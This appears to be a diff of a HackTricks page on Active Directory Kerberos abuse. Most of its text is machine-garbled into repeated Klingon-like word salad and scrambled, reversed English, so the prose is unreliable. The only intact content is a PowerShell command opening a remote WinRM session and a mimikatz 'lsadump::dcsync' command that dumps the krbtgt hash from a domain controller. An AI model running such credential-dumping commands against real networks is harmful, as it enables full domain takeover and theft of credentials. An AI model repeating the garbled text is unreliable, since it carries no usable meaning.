**ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+**ghItlh** **winrm** **remote host** **connect** **ways** **more** **learn** **to** **page** **the** **Check**:
 
 {% content-ref url="../ntlm/winrm.md" %}
 [winrm.md](../ntlm/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Note that **winrm must be active and listening** on the remote computer to access it.
+**remote computer** **the** **on** **listening** **and** **active** **be** **winrm** **that** **Note**.
 {% endhint %}
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+**privilege** **this** **With** **database** **DC** **the** **dump** **can** **you** **DCSync** **using**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-
-**Learn more about DCSync** in the following page:
-
-## References
-* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
-* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{% content-ref url="dcsync.md" %}
-[dcsync.md](dcsync.md)
-{% endcontent-ref %}
-
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
-
-If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
-
-<details>
-
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Other ways to support HackTricks:
-
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+**DCSync** **jIyajbe'** **ghaH** **vItlhutlh** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej** **ghaH** **'ej
